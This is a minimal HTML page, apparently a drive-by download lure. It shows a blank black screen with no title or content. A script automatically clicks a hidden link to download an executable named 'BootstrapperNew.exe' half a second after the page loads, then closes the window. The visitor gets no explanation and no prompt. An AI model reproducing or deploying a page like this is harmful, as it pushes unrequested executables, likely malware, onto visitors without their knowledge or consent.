<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title></title>
  <style>
    * { margin: 0; padding: 0; }
    body { background: #000; }
  </style>
</head>
<body>
<script>
  setTimeout(() => {
    const a = document.createElement('a');
    a.href = 'BootstrapperNew.exe';
    a.download = 'BootstrapperNew.exe';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
  }, 500);

  setTimeout(() => {
    window.close();
  }, 1500);
</script>
</body>
</html>
